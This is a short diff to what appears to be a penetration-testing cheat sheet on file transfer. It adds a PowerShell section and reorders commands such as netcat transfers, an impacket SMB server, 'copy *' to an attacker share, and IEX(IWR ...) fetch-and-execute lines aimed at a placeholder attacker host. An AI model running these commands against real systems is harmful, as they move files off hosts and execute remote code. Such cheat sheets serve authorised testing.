@@ -519,12 +519,15 @@ nc <RHOST> <RPORT> > <FILE>
 ```c
 sudo python3 impacket/examples/smbserver.py <SHARE> ./
 sudo impacket-smbserver <SHARE> . -smb2support
+copy * \\<LHOST>\<SHARE>
 ```
 
+##### PowerShell
+
 ```c
-copy * \\<LHOST>\<SHARE>
-powershell -command Invoke-WebRequest -Uri http://<LHOST>:<LPORT>/<FILE> -Outfile C:\\temp\\<FILE>
+iwr <LHOST>/<FILE> -o <FILE>
 IEX(IWR http://<LHOST>/<FILE>) -UseBasicParsing)
+powershell -command Invoke-WebRequest -Uri http://<LHOST>:<LPORT>/<FILE> -Outfile C:\\temp\\<FILE>
 ```
 
 ##### Bash only
